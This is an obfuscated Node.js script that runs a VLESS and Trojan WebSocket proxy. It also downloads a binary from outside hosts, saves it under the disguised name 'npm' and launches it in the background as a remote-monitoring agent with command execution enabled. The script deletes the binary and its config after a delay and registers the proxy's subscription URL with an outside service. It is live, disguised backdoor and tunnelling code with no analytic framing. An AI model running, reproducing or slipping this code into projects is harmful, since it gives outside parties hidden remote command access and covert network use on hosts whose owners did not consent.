const _0x125eff=_0x2d71;(function(_0x3b0a16,_0x37842d){const _0xd671fb=_0x2d71,_0x202cd9=_0x3b0a16();while(!![]){try{const _0x14a7ed=parseInt(_0xd671fb(0x1c2))/0x1*(parseInt(_0xd671fb(0x1c6))/0x2)+-parseInt(_0xd671fb(0x1a2))/0x3*(-parseInt(_0xd671fb(0x1f5))/0x4)+-parseInt(_0xd671fb(0x203))/0x5*(-parseInt(_0xd671fb(0x1ea))/0x6)+parseInt(_0xd671fb(0x1ee))/0x7+parseInt(_0xd671fb(0x1bc))/0x8+parseInt(_0xd671fb(0x1de))/0x9+parseInt(_0xd671fb(0x19c))/0xa*(-parseInt(_0xd671fb(0x206))/0xb);if(_0x14a7ed===_0x37842d)break;else _0x202cd9['push'](_0x202cd9['shift']());}catch(_0x353bfb){_0x202cd9['push'](_0x202cd9['shift']());}}}(_0x5ec4,0xdf80a));const os=require('os'),http=require(_0x125eff(0x1b7)),fs=require('fs'),axios=require(_0x125eff(0x1ca)),net=require(_0x125eff(0x1c0)),path=require(_0x125eff(0x1af)),crypto=require('crypto'),{Buffer}=require(_0x125eff(0x1f3)),{exec,execSync}=require(_0x125eff(0x1a8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x125eff(0x1bb)][_0x125eff(0x19e)]||'453cfd17-e038-485a-a464-cc23710839fd',NEZHA_SERVER=process[_0x125eff(0x1bb)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x125eff(0x1bb)][_0x125eff(0x1fe)]||'',NEZHA_KEY=process[_0x125eff(0x1bb)]['NEZHA_KEY']||'',DOMAIN=process[_0x125eff(0x1bb)][_0x125eff(0x1b8)]||_0x125eff(0x1ce),AUTO_ACCESS=process[_0x125eff(0x1bb)][_0x125eff(0x202)]||![],WSPATH=process[_0x125eff(0x1bb)][_0x125eff(0x1cc)]||UUID[_0x125eff(0x1e7)](0x0,0x8),SUB_PATH=process[_0x125eff(0x1bb)][_0x125eff(0x200)]||_0x125eff(0x1f2),NAME=process[_0x125eff(0x1bb)][_0x125eff(0x20b)]||'',PORT=process[_0x125eff(0x1bb)][_0x125eff(0x1e9)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x1fb0e8=_0x125eff;try{const _0x5349fd=await axios[_0x1fb0e8(0x1f0)](_0x1fb0e8(0x20a)),_0x393fed=_0x5349fd[_0x1fb0e8(0x1a3)];ISP=(_0x393fed['country']+'-'+_0x393fed['asOrganization'])['replace'](/ /g,'_');}catch(_0x2497cc){ISP='Unknown';}};GetISP();const httpServer=http[_0x125eff(0x1f8)]((_0x36905f,_0x8fd144)=>{const _0x48a68c=_0x125eff;if(_0x36905f[_0x48a68c(0x1f7)]==='/'){const _0x4e62b7=path['join'](__dirname,_0x48a68c(0x1dd));fs[_0x48a68c(0x199)](_0x4e62b7,'utf8',(_0x2323f3,_0x52b962)=>{const _0x1de347=_0x48a68c;if(_0x2323f3){_0x8fd144[_0x1de347(0x1b2)](0xc8,{'Content-Type':'text/html'}),_0x8fd144[_0x1de347(0x1a1)](_0x1de347(0x1f6));return;}_0x8fd144[_0x1de347(0x1b2)](0xc8,{'Content-Type':'text/html'}),_0x8fd144['end'](_0x52b962);});return;}else{if(_0x36905f[_0x48a68c(0x1f7)]==='/'+SUB_PATH){const _0x95a77=NAME?NAME+'-'+ISP:ISP,_0x998854=_0x48a68c(0x1cb)+UUID+_0x48a68c(0x1ec)+DOMAIN+_0x48a68c(0x1da)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x95a77,_0x1ff0f4='trojan://'+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x48a68c(0x1da)+DOMAIN+_0x48a68c(0x1a5)+WSPATH+'#'+_0x95a77,_0x495b54=_0x998854+'\x0a'+_0x1ff0f4,_0x4d29d8=Buffer['from'](_0x495b54)[_0x48a68c(0x1a6)](_0x48a68c(0x1b5));_0x8fd144[_0x48a68c(0x1b2)](0xc8,{'Content-Type':'text/plain'}),_0x8fd144[_0x48a68c(0x1a1)](_0x4d29d8+'\x0a');}else _0x8fd144[_0x48a68c(0x1b2)](0x194,{'Content-Type':_0x48a68c(0x1fb)}),_0x8fd144[_0x48a68c(0x1a1)](_0x48a68c(0x19f));}}),wss=new WebSocket[(_0x125eff(0x1c8))]({'server':httpServer}),uuid=UUID[_0x125eff(0x1fa)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x125eff(0x1fd)];function resolveHost(_0x302af7){return new Promise((_0x5ec741,_0x3c7619)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x302af7)){_0x5ec741(_0x302af7);return;}let _0x349fc0=0x0;function _0x264c74(){const _0x3e7e3f=_0x2d71;if(_0x349fc0>=DNS_SERVERS[_0x3e7e3f(0x1e1)]){_0x3c7619(new Error(_0x3e7e3f(0x1c1)+_0x302af7+_0x3e7e3f(0x1bd)));return;}const _0x359614=DNS_SERVERS[_0x349fc0];_0x349fc0++;const _0x4021b7=_0x3e7e3f(0x196)+encodeURIComponent(_0x302af7)+'&type=A';axios[_0x3e7e3f(0x1f0)](_0x4021b7,{'timeout':0x1388,'headers':{'Accept':_0x3e7e3f(0x19a)}})[_0x3e7e3f(0x1d1)](_0x29fa86=>{const _0xd48155=_0x3e7e3f,_0x468fca=_0x29fa86['data'];if(_0x468fca['Status']===0x0&&_0x468fca[_0xd48155(0x1eb)]&&_0x468fca[_0xd48155(0x1eb)][_0xd48155(0x1e1)]>0x0){const _0xdc4e80=_0x468fca[_0xd48155(0x1eb)][_0xd48155(0x1db)](_0x430256=>_0x430256[_0xd48155(0x1f1)]===0x1);if(_0xdc4e80){_0x5ec741(_0xdc4e80[_0xd48155(0x1a3)]);return;}}_0x264c74();})[_0x3e7e3f(0x1fc)](_0x4ea21a=>{_0x264c74();});}_0x264c74();});}function handleVlessConnection(_0x2ae095,_0x361f2d){const _0x1d01a8=_0x125eff,[_0xf67ef4]=_0x361f2d,_0x55f396=_0x361f2d[_0x1d01a8(0x1e7)](0x1,0x11);if(!_0x55f396['every']((_0xcde639,_0x15771a)=>_0xcde639==parseInt(uuid[_0x1d01a8(0x1ad)](_0x15771a*0x2,0x2),0x10)))return![];let _0x31a23d=_0x361f2d[_0x1d01a8(0x1e7)](0x11,0x12)[_0x1d01a8(0x1b4)]()+0x13;const _0xcca32c=_0x361f2d[_0x1d01a8(0x1e7)](_0x31a23d,_0x31a23d+=0x2)[_0x1d01a8(0x1a0)](0x0),_0x121139=_0x361f2d[_0x1d01a8(0x1e7)](_0x31a23d,_0x31a23d+=0x1)[_0x1d01a8(0x1b4)](),_0x3449e8=_0x121139==0x1?_0x361f2d[_0x1d01a8(0x1e7)](_0x31a23d,_0x31a23d+=0x4)['join']('.'):_0x121139==0x2?new TextDecoder()[_0x1d01a8(0x1ae)](_0x361f2d[_0x1d01a8(0x1e7)](_0x31a23d+0x1,_0x31a23d+=0x1+_0x361f2d[_0x1d01a8(0x1e7)](_0x31a23d,_0x31a23d+0x1)[_0x1d01a8(0x1b4)]())):_0x121139==0x3?_0x361f2d[_0x1d01a8(0x1e7)](_0x31a23d,_0x31a23d+=0x10)['reduce']((_0x3c0d62,_0x27320e,_0x5cf66f,_0x5e117b)=>_0x5cf66f%0x2?_0x3c0d62[_0x1d01a8(0x209)](_0x5e117b[_0x1d01a8(0x1e7)](_0x5cf66f-0x1,_0x5cf66f+0x1)):_0x3c0d62,[])[_0x1d01a8(0x197)](_0x2d6074=>_0x2d6074['readUInt16BE'](0x0)[_0x1d01a8(0x1a6)](0x10))[_0x1d01a8(0x1e8)](':'):'';_0x2ae095[_0x1d01a8(0x1d8)](new Uint8Array([_0xf67ef4,0x0]));const _0x1a05a0=createWebSocketStream(_0x2ae095);return resolveHost(_0x3449e8)[_0x1d01a8(0x1d1)](_0x50e07f=>{const _0x2d754a=_0x1d01a8;net['connect']({'host':_0x50e07f,'port':_0xcca32c},function(){const _0x416bd2=_0x2d71;this[_0x416bd2(0x1a7)](_0x361f2d[_0x416bd2(0x1e7)](_0x31a23d)),_0x1a05a0['on'](_0x416bd2(0x1f4),()=>{})['pipe'](this)['on'](_0x416bd2(0x1f4),()=>{})[_0x416bd2(0x1b1)](_0x1a05a0);})['on'](_0x2d754a(0x1f4),()=>{});})[_0x1d01a8(0x1fc)](_0x1b2c0d=>{const _0x1cffae=_0x1d01a8;net[_0x1cffae(0x19d)]({'host':_0x3449e8,'port':_0xcca32c},function(){const _0x140133=_0x1cffae;this[_0x140133(0x1a7)](_0x361f2d[_0x140133(0x1e7)](_0x31a23d)),_0x1a05a0['on'](_0x140133(0x1f4),()=>{})[_0x140133(0x1b1)](this)['on'](_0x140133(0x1f4),()=>{})[_0x140133(0x1b1)](_0x1a05a0);})['on'](_0x1cffae(0x1f4),()=>{});}),!![];}function handleTrojanConnection(_0x387c69,_0x451383){const _0x41c053=_0x125eff;try{if(_0x451383[_0x41c053(0x1e1)]<0x3a)return![];const _0x249be2=_0x451383[_0x41c053(0x1e7)](0x0,0x38)[_0x41c053(0x1a6)](),_0x3bae10=[UUID];let _0xb3275b=null;for(const _0x1eb9cf of _0x3bae10){const _0x5eed7b=crypto[_0x41c053(0x1e2)](_0x41c053(0x1d0))['update'](_0x1eb9cf)['digest'](_0x41c053(0x1a9));if(_0x5eed7b===_0x249be2){_0xb3275b=_0x1eb9cf;break;}}if(!_0xb3275b)return![];let _0x29f53f=0x38;_0x451383[_0x29f53f]===0xd&&_0x451383[_0x29f53f+0x1]===0xa&&(_0x29f53f+=0x2);const _0x477014=_0x451383[_0x29f53f];if(_0x477014!==0x1)return![];_0x29f53f+=0x1;const _0x3ca820=_0x451383[_0x29f53f];_0x29f53f+=0x1;let _0x4c197f,_0x499d9c;if(_0x3ca820===0x1)_0x4c197f=_0x451383[_0x41c053(0x1e7)](_0x29f53f,_0x29f53f+0x4)[_0x41c053(0x1e8)]('.'),_0x29f53f+=0x4;else{if(_0x3ca820===0x3){const _0x125b5c=_0x451383[_0x29f53f];_0x29f53f+=0x1,_0x4c197f=_0x451383[_0x41c053(0x1e7)](_0x29f53f,_0x29f53f+_0x125b5c)[_0x41c053(0x1a6)](),_0x29f53f+=_0x125b5c;}else{if(_0x3ca820===0x4)_0x4c197f=_0x451383[_0x41c053(0x1e7)](_0x29f53f,_0x29f53f+0x10)[_0x41c053(0x1be)]((_0x3e08c3,_0x1323fd,_0x4f2bd9,_0x3d387b)=>_0x4f2bd9%0x2?_0x3e08c3[_0x41c053(0x209)](_0x3d387b[_0x41c053(0x1e7)](_0x4f2bd9-0x1,_0x4f2bd9+0x1)):_0x3e08c3,[])['map'](_0x280041=>_0x280041[_0x41c053(0x1a0)](0x0)[_0x41c053(0x1a6)](0x10))[_0x41c053(0x1e8)](':'),_0x29f53f+=0x10;else return![];}}_0x499d9c=_0x451383[_0x41c053(0x1a0)](_0x29f53f),_0x29f53f+=0x2;_0x29f53f<_0x451383[_0x41c053(0x1e1)]&&_0x451383[_0x29f53f]===0xd&&_0x451383[_0x29f53f+0x1]===0xa&&(_0x29f53f+=0x2);const _0x3e45e7=createWebSocketStream(_0x387c69);return resolveHost(_0x4c197f)[_0x41c053(0x1d1)](_0x65cc58=>{const _0x48d2e4=_0x41c053;net['connect']({'host':_0x65cc58,'port':_0x499d9c},function(){const _0x398966=_0x2d71;_0x29f53f<_0x451383['length']&&this['write'](_0x451383[_0x398966(0x1e7)](_0x29f53f)),_0x3e45e7['on']('error',()=>{})[_0x398966(0x1b1)](this)['on'](_0x398966(0x1f4),()=>{})[_0x398966(0x1b1)](_0x3e45e7);})['on'](_0x48d2e4(0x1f4),()=>{});})['catch'](_0x1797d0=>{const _0xe17a59=_0x41c053;net['connect']({'host':_0x4c197f,'port':_0x499d9c},function(){const _0x2a75a6=_0x2d71;_0x29f53f<_0x451383[_0x2a75a6(0x1e1)]&&this[_0x2a75a6(0x1a7)](_0x451383['slice'](_0x29f53f)),_0x3e45e7['on'](_0x2a75a6(0x1f4),()=>{})[_0x2a75a6(0x1b1)](this)['on'](_0x2a75a6(0x1f4),()=>{})['pipe'](_0x3e45e7);})['on'](_0xe17a59(0x1f4),()=>{});}),!![];}catch(_0x5de5da){return![];}}wss['on'](_0x125eff(0x1c3),(_0x457acf,_0xe44eea)=>{const _0x2b1e0f=_0x125eff,_0x18188b=_0xe44eea['url']||'';_0x457acf[_0x2b1e0f(0x1c4)]('message',_0x3093e4=>{const _0x103b66=_0x2b1e0f;if(_0x3093e4[_0x103b66(0x1e1)]>0x11&&_0x3093e4[0x0]===0x0){const _0x527630=_0x3093e4[_0x103b66(0x1e7)](0x1,0x11),_0x1c13a0=_0x527630['every']((_0x327be5,_0x180cca)=>_0x327be5==parseInt(uuid[_0x103b66(0x1ad)](_0x180cca*0x2,0x2),0x10));if(_0x1c13a0){!handleVlessConnection(_0x457acf,_0x3093e4)&&_0x457acf[_0x103b66(0x198)]();return;}}!handleTrojanConnection(_0x457acf,_0x3093e4)&&_0x457acf['close']();})['on'](_0x2b1e0f(0x1f4),()=>{});});function _0x2d71(_0x40a1fb,_0x21ed84){_0x40a1fb=_0x40a1fb-0x194;const _0x5ec4c6=_0x5ec4();let _0x2d71e1=_0x5ec4c6[_0x40a1fb];return _0x2d71e1;}function _0x5ec4(){const _0x3c9c38=['substr','decode','path','application/json','pipe','writeHead','trim','readUInt8','base64','\x20-p\x20','http','DOMAIN','/bin/bash','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','env','4239472fueQdG','\x20with\x20all\x20DNS\x20servers','reduce','true','net','Failed\x20to\x20resolve\x20','215ElKFfP','connection','once','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','13738PllOAN','2083','Server','--tls','axios','vless://','WSPATH','client_secret:\x20','1234.abc.com','2053','sha224','then','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arm64','split','npm\x20is\x20running','443','https://','send','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','&fp=chrome&type=ws&host=','find','Automatic\x20Access\x20Task\x20added\x20successfully','index.html','13465314xmAZJg','includes','stream','length','createHash','unlink','post','https://oooo.serv00.net/add-url','config.yaml','slice','join','PORT','140502GZRzJI','Answer','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','log','4918697htpdxo','npm','get','type','sub','buffer','error','2868AmmvoG','Hello\x20world!','url','createServer','finish','replace','text/plain','catch','1.1.1.1','NEZHA_PORT','pop','SUB_PATH','https://amd64.ssss.nyc.mn/v1','AUTO_ACCESS','50GNDiFE','https://amd64.ssss.nyc.mn/agent','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','11ORgRoK','npm\x20running\x20error:','8443','concat','https://speed.cloudflare.com/meta','NAME','npm\x20download\x20successfully','Server\x20is\x20running\x20on\x20port\x20','https://dns.google/resolve?name=','map','close','readFile','application/dns-json','https://arm64.ssss.nyc.mn/v1','42491770fGPwIj','connect','UUID','Not\x20Found\x0a','readUInt16BE','end','3033cYsucw','data','arm','&path=%2F','toString','write','child_process','hex','false','utf-8','aarch64'];_0x5ec4=function(){return _0x3c9c38;};return _0x5ec4();}const getDownloadUrl=()=>{const _0x1212b5=_0x125eff,_0x620292=os['arch']();return _0x620292===_0x1212b5(0x1a4)||_0x620292===_0x1212b5(0x1d3)||_0x620292===_0x1212b5(0x1ac)?!NEZHA_PORT?_0x1212b5(0x19b):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1212b5(0x201):_0x1212b5(0x204);},downloadFile=async()=>{const _0x5eab81=_0x125eff;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xf2f311=getDownloadUrl(),_0x32b765=await axios({'method':_0x5eab81(0x1f0),'url':_0xf2f311,'responseType':_0x5eab81(0x1e0)}),_0x552e54=fs['createWriteStream'](_0x5eab81(0x1ef));return _0x32b765[_0x5eab81(0x1a3)][_0x5eab81(0x1b1)](_0x552e54),new Promise((_0x500b64,_0x84815d)=>{const _0x4b2b80=_0x5eab81;_0x552e54['on'](_0x4b2b80(0x1f9),()=>{const _0x529da0=_0x4b2b80;console[_0x529da0(0x1ed)](_0x529da0(0x194)),exec('chmod\x20+x\x20npm',_0xae54ea=>{if(_0xae54ea)_0x84815d(_0xae54ea);_0x500b64();});}),_0x552e54['on'](_0x4b2b80(0x1f4),_0x84815d);});}catch(_0x3d64fd){throw _0x3d64fd;}},runnz=async()=>{const _0x4e8fa5=_0x125eff;try{const _0x183c72=execSync(_0x4e8fa5(0x205),{'encoding':_0x4e8fa5(0x1ab)});if(_0x183c72[_0x4e8fa5(0x1b3)]()!==''){console[_0x4e8fa5(0x1ed)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x29d42b){}await downloadFile();let _0x40c1b0='',_0x43f16b=[_0x4e8fa5(0x1d6),_0x4e8fa5(0x208),'2096','2087',_0x4e8fa5(0x1c7),_0x4e8fa5(0x1cf)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xc8ecb=_0x43f16b[_0x4e8fa5(0x1df)](NEZHA_PORT)?_0x4e8fa5(0x1c9):'';_0x40c1b0='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e8fa5(0x1b6)+NEZHA_KEY+'\x20'+_0xc8ecb+_0x4e8fa5(0x1ba);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3a8deb=NEZHA_SERVER[_0x4e8fa5(0x1df)](':')?NEZHA_SERVER[_0x4e8fa5(0x1d4)](':')[_0x4e8fa5(0x1ff)]():'',_0x535043=_0x43f16b[_0x4e8fa5(0x1df)](_0x3a8deb)?_0x4e8fa5(0x1bf):_0x4e8fa5(0x1aa),_0x45ef01=_0x4e8fa5(0x1cd)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4e8fa5(0x1c5)+_0x535043+_0x4e8fa5(0x1d2)+UUID;fs['writeFileSync'](_0x4e8fa5(0x1e6),_0x45ef01);}_0x40c1b0=_0x4e8fa5(0x1d9);}else{console[_0x4e8fa5(0x1ed)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x40c1b0,{'shell':_0x4e8fa5(0x1b9)},_0x328d6f=>{const _0x5ddd79=_0x4e8fa5;if(_0x328d6f)console[_0x5ddd79(0x1f4)](_0x5ddd79(0x207),_0x328d6f);else console[_0x5ddd79(0x1ed)](_0x5ddd79(0x1d5));});}catch(_0x47f127){console[_0x4e8fa5(0x1f4)]('error:\x20'+_0x47f127);}};async function addAccessTask(){const _0x54c3c2=_0x125eff;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x451a56=_0x54c3c2(0x1d7)+DOMAIN+'/'+SUB_PATH;try{const _0x20bd04=await axios[_0x54c3c2(0x1e4)](_0x54c3c2(0x1e5),{'url':_0x451a56},{'headers':{'Content-Type':_0x54c3c2(0x1b0)}});console['log'](_0x54c3c2(0x1dc));}catch(_0x5b1eda){}}const delFiles=()=>{const _0x4c7866=_0x125eff;fs[_0x4c7866(0x1e3)]('npm',()=>{}),fs['unlink'](_0x4c7866(0x1e6),()=>{});};httpServer['listen'](PORT,()=>{const _0x532997=_0x125eff;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x532997(0x1ed)](_0x532997(0x195)+PORT);});
